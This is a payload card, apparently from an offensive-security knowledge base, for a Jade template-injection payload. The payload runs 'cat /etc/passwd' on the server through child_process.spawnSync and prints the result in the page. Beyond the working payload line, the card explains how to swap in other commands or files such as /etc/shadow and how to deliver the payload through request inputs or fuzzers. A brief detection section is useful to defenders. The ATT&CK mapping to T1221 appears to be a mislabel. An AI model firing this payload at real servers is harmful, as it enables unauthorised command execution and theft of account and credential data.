---
type: code
language: javascript
verified: true
platforms:
  - web
  - linux
tags:
  - ssti
  - discovery
  - payload
validated: true
---

# jade-ssti-list-users-payload

## Code

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

## Description

This JavaScript expression, embedded in Jade templates, exploits SSTI to synchronously run 'cat /etc/passwd' using child_process.spawnSync and insert the stdout into the HTTP response. It allows direct enumeration of system users without external tools, aiding in target profiling.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Command in spawnSync | Executable (default: 'cat') | 'ls' |
| Args array | Arguments (default: ['/etc/passwd']) | ['/etc/shadow'] |

## Usage

Place this in a vulnerable template input (e.g., via GET/POST). The '#{}' evaluates and outputs the result inline in the page. Ideal for quick recon in SSTI-confirmed apps; adapt for other files like /etc/group. Deliver via manual testing or automated fuzzers.

## Detection

- Application logs showing spawnSync calls or file reads (/etc/passwd) from template evaluation.
- Response analysis: Unusual content like user lists in rendered pages.
- Behavioral: Node.js processes accessing sensitive files unexpectedly.
- Input scanning for 'spawnSync' or 'stdout' patterns.

## Related

- [[procedures/server-side-template-injection-jade-exec-command-and-list-users]]
- [[techniques/Template-Injection|T1221 - Template Injection]]
